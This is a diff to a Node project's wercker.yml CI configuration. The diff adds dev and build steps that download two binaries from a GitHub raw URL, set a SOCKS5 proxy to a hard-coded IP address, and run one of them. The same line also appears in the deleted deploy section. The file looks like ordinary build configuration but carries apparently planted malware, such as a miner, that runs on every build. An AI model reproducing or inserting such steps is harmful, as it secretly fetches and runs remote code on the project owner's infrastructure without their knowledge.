@@ -1,29 +1,24 @@
-box: node
+box: 
+  id: node:latest
+  ports: 
+    - "8080"
+    
+dev:
+  steps:
+    - npm-install
+    - internal/watch:
+        code: wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1
+        reload: true
+
 build:
   steps:
+    - script:
+        code: wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1
+    - npm-install
+    - npm-test
     - script:
         name: echo nodejs information
         code: |
           echo "node version $(node -v) running"
           echo "npm version $(npm -v) running"
-    - npm-install
-
-deploy:
-  openshift:
-    - add-ssh-key:
-        keyname: OPENSHIFT_SSH_KEY
-        host: $OPENSHIFT_HOST
-    - add-to-known_hosts:
-        hostname: $OPENSHIFT_HOST
-    - script:
-        name: git setup
-        code: |
-          git config --global user.email $EMAIL_ADDRESS
-          git config --global user.name $USER_NAME
-          git config --global push.default matching
-    - script:
-        name: deploy
-        code: |
-          git push $OPENSHIFT_GIT_URL $OPENSHIFT_BRANCH
-          sudo apt-get install  -y wget
-          wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1
+          
